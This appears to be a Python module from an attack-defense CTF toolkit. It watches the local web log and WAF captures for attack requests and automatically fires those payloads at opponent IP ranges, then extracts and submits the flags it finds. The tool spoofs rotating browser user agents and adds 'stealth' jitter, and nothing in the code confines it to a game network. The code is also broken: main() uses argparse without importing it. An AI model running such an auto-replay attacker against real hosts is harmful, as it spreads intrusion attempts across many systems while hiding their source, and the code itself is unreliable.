#!/usr/bin/env python3
"""Autonomous copilot loop for Attack-Defense CTF.

Features:
  1. Real-time web log sniffer + WAF intercept capture
  2. Anti-Replay Loop & Deduplication TTL cache (prevents flood & repeated fire)
  3. Anti-Friendly-Fire: excludes own IP & game server
  4. Multi-threaded rate-limited auto-replay against opponent IP ranges
  5. Automatic flag extraction & submission with SQLite retry queue
  6. Periodic SLA health verification
"""

import concurrent.futures
import hashlib
import ipaddress
import json
import os
import random
import re
import socket
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

from .colors import Colors, colorize, print_banner, safe_print
from .patterns import ATTACK_RULES, COMBINED_LOG_REGEX, COMMON_LOG_REGEX, FLAG_REGEX, compile_flag_regex
from .scanner import get_db, now_iso
from .flag_submitter import FlagSubmitter

DB_DEFAULT = os.path.expanduser("~/.adctf/state.db")


def expand_target_ips(target_spec: str) -> List[str]:
    """Expand IP specifications like 10.60.1-20.1 or 10.10.1.1-10.10.1.20."""
    targets = []
    if not target_spec:
        return targets

    for part in target_spec.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part and re.match(r"^\d+\.\d+\.\d+-\d+\.\d+$", part):
            o1, o2, start_o3, end_o3, o4 = map(int, re.match(r"^(\d+)\.(\d+)\.(\d+)-(\d+)\.(\d+)$", part).groups())
            for o3 in range(start_o3, end_o3 + 1):
                targets.append(f"{o1}.{o2}.{o3}.{o4}")
        elif "-" in part and re.match(r"^\d+\.\d+\.\d+\.\d+-\d+\.\d+\.\d+\.\d+$", part):
            start_ip, end_ip = part.split("-")
            s_int, e_int = int(ipaddress.IPv4Address(start_ip)), int(ipaddress.IPv4Address(end_ip))
            for ip_int in range(s_int, e_int + 1):
                targets.append(str(ipaddress.IPv4Address(ip_int)))
        elif "/" in part:
            try:
                net = ipaddress.ip_network(part, strict=False)
                for ip in net.hosts():
                    targets.append(str(ip))
            except Exception:
                targets.append(part)
        else:
            targets.append(part)
    return list(dict.fromkeys(targets))


def get_local_ips() -> Set[str]:
    """Get all local interface IPs to prevent friendly fire."""
    local = {"127.0.0.1", "::1", "localhost"}
    try:
        hostname = socket.gethostname()
        for ip in socket.gethostbyname_ex(hostname)[2]:
            local.add(ip)
    except Exception:
        pass
    return local


def run_autopilot(
    targets_spec: str = "",
    submit_url: Optional[str] = None,
    token: Optional[str] = None,
    log_file: Optional[str] = None,
    waf_capture: str = "/tmp/waf_captured.jsonl",
    port: int = 80,
    threads: int = 10,
    db_path: str = DB_DEFAULT,
    sla_check_interval: float = 30.0,
    flag_pattern: Optional[str] = None,
    rate_delay: float = 1.0,
) -> int:
    """Run the complete autonomous copilot loop with anti-loop and retry queues."""
    log_candidates = [
        log_file,
        "/var/log/nginx/access.log",
        "/var/log/apache2/access.log",
        "access.log",
    ]
    log_path = next((p for p in log_candidates if p and os.path.isfile(p)), None)

    all_targets = expand_target_ips(targets_spec)
    local_ips = get_local_ips()

    # Filter out local IPs from targets
    targets = [t for t in all_targets if t not in local_ips]

    flag_rx = compile_flag_regex(flag_pattern)

    submitter = None
    if submit_url:
        submitter = FlagSubmitter(server_url=submit_url, token=token, db_path=db_path)

    print_banner("AD-CTF Autopilot / Operator Mode", "Autonomous Defense Radar + Auto-Replay + Auto-Submit")
    safe_print(f"[*] Access Log       : {colorize(log_path or 'Not active (waiting)', Colors.GREEN if log_path else Colors.YELLOW)}")
    safe_print(f"[*] WAF Capture      : {colorize(waf_capture, Colors.CYAN)}")
    safe_print(f"[*] Opponent Targets : {colorize(f'{len(targets)} enemy hosts' if targets else 'Disabled (no targets)', Colors.YELLOW)}")
    safe_print(f"[*] Flag Regex       : {colorize(flag_rx.pattern, Colors.GREEN)}")
    safe_print(f"[*] Auto-Submit Flag : {colorize(submit_url if submit_url else 'Disabled', Colors.CYAN)}")
    safe_print(f"[*] Anti-Loop Cache  : {colorize('ACTIVE (90s TTL payload deduplication)', Colors.BRIGHT_GREEN)}")
    safe_print(f"[*] Status           : {colorize('AUTONOMOUS COPILOT RUNNING', Colors.BOLD + Colors.BRIGHT_GREEN)}")
    safe_print(colorize("-" * 75, Colors.DIM))
    safe_print(colorize("[*] Duduk santai, biarkan Autopilot bekerja. Tekan Ctrl+C untuk berhenti.\n", Colors.WHITE))

    conn = get_db(db_path)
    seen_flags: Set[str] = set()
    replay_cache: Dict[str, float] = {}      # hash -> timestamp
    circuit_breaker: Dict[str, float] = {}   # tip -> cooldown_until_timestamp
    fail_counts: Dict[str, int] = {}         # tip -> consecutive_failures
    last_sla_check = 0.0
    last_queue_flush = 0.0

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    ]

    def check_sla_quick():
        try:
            req = urllib.request.Request(f"http://127.0.0.1:{port}/", headers={"User-Agent": "Autopilot-SLA/2.0"})
            with urllib.request.urlopen(req, timeout=2.5) as resp:
                if 200 <= resp.status < 400:
                    safe_print(f" [{datetime.now().strftime('%H:%M:%S')}] {colorize('[SLA HEALTH: OK (200)]', Colors.BOLD + Colors.GREEN)} Web server normal.")
                else:
                    safe_print(f" [{datetime.now().strftime('%H:%M:%S')}] {colorize(f'[SLA ALERT: HTTP {resp.status}]', Colors.BG_RED + Colors.BOLD + Colors.WHITE)} Periksa web server!")
        except Exception as e:
            safe_print(f" [{datetime.now().strftime('%H:%M:%S')}] {colorize('[SLA DOWN! ERROR]', Colors.BG_RED + Colors.BOLD + Colors.WHITE)} Web crash ({str(e)[:30]})! Periksa webroot!")

    def fire_target(tip: str, method: str, uri: str, body: Optional[str] = None) -> Tuple[str, List[str]]:
        now = time.time()
        # Circuit Breaker Check: Skip dead target if on cooldown
        if tip in circuit_breaker and now < circuit_breaker[tip]:
            return tip, []

        url = f"http://{tip}:{port}{uri}"
        try:
            # Stealth Micro-Jitter (prevents synchronized burst spikes)
            time.sleep(random.uniform(0.02, 0.12))

            data = None
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "*/*",
            }
            if body and method.upper() in ("POST", "PUT", "PATCH"):
                data = body.encode("utf-8")
                trimmed_body = body.strip()
                if (trimmed_body.startswith("{") and trimmed_body.endswith("}")) or (trimmed_body.startswith("[") and trimmed_body.endswith("]")):
                    headers["Content-Type"] = "application/json"
                else:
                    headers["Content-Type"] = "application/x-www-form-urlencoded"

            req = urllib.request.Request(url, data=data, method=method.upper(), headers=headers)
            with urllib.request.urlopen(req, timeout=3.0) as resp:
                resp_body = resp.read().decode("utf-8", errors="replace")
                # Reset failure count on success
                fail_counts[tip] = 0
                return tip, flag_rx.findall(resp_body)
        except Exception:
            # Target failure tracking
            fail_counts[tip] = fail_counts.get(tip, 0) + 1
            if fail_counts[tip] >= 3:
                circuit_breaker[tip] = now + 45.0  # Mute dead target for 45s
            return tip, []

    def trigger_replay(method: str, uri: str, body: Optional[str] = None):
        if not targets:
            return

        # ── ANTI-REPLAY DEDUPLICATION (TTL Cache) ───────────────────────────
        payload_key = f"{method}:{uri}:{body or ''}"
        h = hashlib.md5(payload_key.encode("utf-8")).hexdigest()
        now = time.time()

        if h in replay_cache and (now - replay_cache[h]) < 90.0:
            safe_print(f"   ⚡ {colorize('AUTOPILOT: Payload sama terdeteksi dalam 90s. Skip replay (Anti-Flood Protection).', Colors.DIM)}")
            return

        replay_cache[h] = now
        # Prune old cache entries
        for old_h, t in list(replay_cache.items()):
            if now - t > 180.0:
                del replay_cache[old_h]

        # Filter out targets currently in circuit breaker cooldown
        active_targets = [tip for tip in targets if tip not in circuit_breaker or now >= circuit_breaker[tip]]
        if not active_targets:
            active_targets = targets  # Fallback if all muted

        safe_print(f"   ⚡ {colorize(f'AUTOPILOT: Menembakkan balik payload ke {len(active_targets)} tim lawan (Stealth Jitter active)...', Colors.CYAN)}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(threads, 10)) as pool:
            futs = [pool.submit(fire_target, tip, method, uri, body) for tip in active_targets]
            for fut in concurrent.futures.as_completed(futs):
                tip, flags = fut.result()
                for fl in flags:
                    if fl not in seen_flags:
                        seen_flags.add(fl)
                        safe_print(f"   🚩 {colorize(f'FLAG DICURI DARI {tip}:', Colors.BOLD + Colors.BRIGHT_GREEN)} {colorize(fl, Colors.BOLD + Colors.BRIGHT_WHITE)}")
                        with open("captured_flags.txt", "a", encoding="utf-8") as ff:
                            ff.write(f"[{datetime.now().strftime('%H:%M:%S')}] {tip} -> {fl}\n")

                        if submitter:
                            submitter.enqueue_flag(fl, token)
                            submitter.process_queue(max_batch=5)

    # Open log file if available
    f_log = None
    if log_path:
        try:
            f_log = open(log_path, "r", encoding="utf-8", errors="replace")
            f_log.seek(0, os.SEEK_END)
        except Exception:
            f_log = None

    f_waf = None
    if os.path.isfile(waf_capture):
        try:
            f_waf = open(waf_capture, "r", encoding="utf-8", errors="replace")
            f_waf.seek(0, os.SEEK_END)
        except Exception:
            f_waf = None

    try:
        while True:
            # 1. SLA check loop (every N seconds)
            if time.time() - last_sla_check > sla_check_interval:
                check_sla_quick()
                last_sla_check = time.time()

            # 2. Retry pending flags queue (every 15 seconds)
            if submitter and (time.time() - last_queue_flush > 15.0):
                submitter.process_queue(max_batch=10)
                last_queue_flush = time.time()

            has_activity = False

            # 3. Read from WAF capture JSONL (high-precision blocked payloads)
            if f_waf or os.path.isfile(waf_capture):
                if not f_waf and os.path.isfile(waf_capture):
                    try:
                        f_waf = open(waf_capture, "r", encoding="utf-8", errors="replace")
                        f_waf.seek(0, os.SEEK_END)
                    except Exception:
                        pass

                if f_waf:
                    waf_line = f_waf.readline()
                    if waf_line:
                        has_activity = True
                        try:
                            wdata = json.loads(waf_line.strip())
                            ts = wdata.get("timestamp", datetime.now().strftime("%H:%M:%S"))
                            ip = wdata.get("ip", "-")
                            method = wdata.get("method", "GET")
                            uri = wdata.get("uri", "/")
                            rule = wdata.get("rule", "WAF-BLOCK")
                            body = wdata.get("body", "")

                            # Skip if attack came from our own IP
                            if ip not in local_ips:
                                safe_print(f"\n[{colorize(ts, Colors.DIM)}] {colorize(' [WAF INTERCEPT] ', Colors.BG_RED + Colors.BOLD + Colors.WHITE)} Dari {colorize(ip, Colors.BOLD + Colors.BRIGHT_WHITE)} [{colorize(rule, Colors.BRIGHT_RED)}]")
                                safe_print(f"   Target: {method} {uri}")
                                trigger_replay(method, uri, body)
                        except Exception:
                            pass

            # 4. Read from Web Server access log (radar scanner)
            if f_log:
                line = f_log.readline()
                if line:
                    has_activity = True
                    m = COMBINED_LOG_REGEX.match(line) or COMMON_LOG_REGEX.match(line)
                    if m:
                        ip = m.group("ip")
                        method = m.group("method")
                        uri = m.group("uri")
                        raw_req = f"{method} {uri}"

                        if ip not in local_ips:
                            for cat, sev, pat, desc in ATTACK_RULES:
                                if pat.search(raw_req):
                                    safe_print(f"\n[{datetime.now().strftime('%H:%M:%S')}] {colorize(f' [RADAR ALERT: {cat}] ', Colors.BG_RED + Colors.BOLD + Colors.WHITE)} Dari {colorize(ip, Colors.BOLD + Colors.YELLOW)}")
                                    safe_print(f"   Target: {method} {uri}")
                                    trigger_replay(method, uri, None)
                                    break

            if not has_activity:
                time.sleep(0.3)

    except KeyboardInterrupt:
        safe_print(colorize("\n\n[*] Autopilot dihentikan oleh operator.", Colors.BOLD + Colors.YELLOW))
        if submitter:
            safe_print("[*] Melakukan flush antrean flag terakhir kali...")
            submitter.process_queue(max_batch=50)
        return 0


def main():
    p = argparse.ArgumentParser(description="CTF Autopilot Defense Radar & Replay")
    p.add_argument("--targets", "-t", default="", help="Target enemy subnet (e.g. 10.60.1-20.1)")
    p.add_argument("--submit-url", "-u", default=None, help="Scoring server submission URL")
    p.add_argument("--token", default=None, help="Team API token")
    p.add_argument("--log", "--log-file", dest="log_file", default=None)
    p.add_argument("--waf-capture", default="/tmp/waf_captured.jsonl")
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--threads", type=int, default=10)
    p.add_argument("--pattern", default=None, help="Custom flag regex pattern")

    args = p.parse_args()
    run_autopilot(
        targets_spec=args.targets,
        submit_url=args.submit_url,
        token=args.token,
        log_file=args.log_file,
        waf_capture=args.waf_capture,
        port=args.port,
        threads=args.threads,
        flag_pattern=args.pattern,
    )


if __name__ == "__main__":
    main()
